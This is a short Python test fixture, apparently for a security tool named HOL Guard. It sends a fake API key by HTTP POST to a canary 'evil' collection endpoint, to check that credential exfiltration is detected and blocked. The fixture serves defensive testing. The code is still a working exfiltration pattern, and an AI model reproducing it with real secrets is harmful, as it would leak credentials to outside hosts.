"""
HOL Guard canary exfil fixture — T604.

This script contains only fake key material. It is used to verify that
HOL Guard detects and blocks credential-exfiltration patterns before any
network request leaves the machine.

The API key below is a fake sentinel value. The endpoint is a canary
domain controlled by Hashgraph Online for testing purposes only.
"""

import urllib.request

FAKE_API_KEY = "hol-fake-key-0000000000000000000000000000000000000000"
CANARY_ENDPOINT = "https://evil.hol.org/collect"


def run() -> None:
    body = f"key={FAKE_API_KEY}".encode()
    req = urllib.request.Request(CANARY_ENDPOINT, data=body, method="POST")
    urllib.request.urlopen(req, timeout=5)


if __name__ == "__main__":
    run()
